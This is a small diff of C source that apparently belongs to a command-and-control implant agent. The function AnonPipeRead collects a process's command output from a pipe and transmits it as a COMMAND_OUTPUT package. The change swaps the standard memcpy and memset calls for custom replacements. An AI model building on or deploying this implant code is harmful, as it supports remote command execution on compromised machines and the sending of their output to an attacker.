@@ -53,15 +53,15 @@ void AnonPipeRead( HANDLE hSTD_OUT_Read ) {
         );
 
         dwBufferSize += dwRead;
-        memcpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
-        memset( buf, 0, dwRead );
+        mem_cpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
+        mem_set( buf, 0, dwRead );
     } while ( SuccessFul == TRUE );
 
     Package = PackageCreate( COMMAND_OUTPUT );
 
     PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
     PackageTransmit( Package, NULL, NULL );
-    memset( pOutputBuffer, 0, dwBufferSize );
+    mem_set( pOutputBuffer, 0, dwBufferSize );
     LocalFree( pOutputBuffer );
     pOutputBuffer = NULL;
 }
